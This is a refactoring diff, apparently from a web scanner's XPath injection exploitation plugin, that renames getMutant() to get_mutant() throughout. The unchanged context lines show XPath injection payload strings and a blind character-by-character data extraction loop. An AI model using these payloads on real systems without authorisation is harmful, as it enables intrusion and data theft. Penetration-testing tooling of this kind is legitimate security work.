@@ -152,7 +152,7 @@ class xpath(AttackPlugin):
             return False
         
         self.STR_DEL = delimiter
-        orig_value = vuln.getMutant().get_original_value()
+        orig_value = vuln.get_mutant().get_original_value()
         
         self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
                                                    self.rnum, self.STR_DEL, 
@@ -206,7 +206,7 @@ class xpath(AttackPlugin):
         single quote or double quote. If an error is found, None is returned.
         '''
         exploit_dc = vuln.get_dc()
-        orig_value = vuln.getMutant().get_original_value()
+        orig_value = vuln.get_mutant().get_original_value()
         functionReference = getattr( self._uri_opener , vuln.get_method() )
         
         true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
@@ -269,7 +269,7 @@ class xpath(AttackPlugin):
         
         exploit_dc = vuln.get_dc()
         functionReference = getattr( self._uri_opener , vuln.get_method() )
-        exploit_dc[ vuln.get_var() ] = vuln.getMutant().get_original_value()
+        exploit_dc[ vuln.get_var() ] = vuln.get_mutant().get_original_value()
 
         om.out.debug( "Testing if body dynamically changes... " )
         try:
@@ -386,7 +386,7 @@ class xpath_reader(shell):
             mid = (maxl + minl) / 2
             om.out.debug( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
 
-            orig_value = self.getMutant().getMutant().get_original_value()
+            orig_value = self.get_mutant().get_mutant().get_original_value()
             skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
 
             findlen = "%s%s and string-length(%s)=%i %s" % (orig_value,
@@ -443,7 +443,7 @@ class xpath_reader(shell):
         for pos in range(ldata):
             for c in range(32,127):
 
-                orig_value = self.getMutant().getMutant().get_original_value()
+                orig_value = self.get_mutant().get_mutant().get_original_value()
                 skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
                 
                 hexcar = chr(c)
@@ -485,7 +485,7 @@ def response_is_error(vuln_obj, res_body, url_opener, use_difflib=True):
         exploit_dc = vuln_obj.get_dc()
         functionReference = getattr( url_opener , vuln_obj.get_method() )
 
-        exploit_dc[ vuln_obj.get_var() ] = vuln_obj.getMutant().get_original_value()
+        exploit_dc[ vuln_obj.get_var() ] = vuln_obj.get_mutant().get_original_value()
 
         # TODO: Perform this request only once
         base_res = functionReference( vuln_obj.getURL(), str(exploit_dc) )
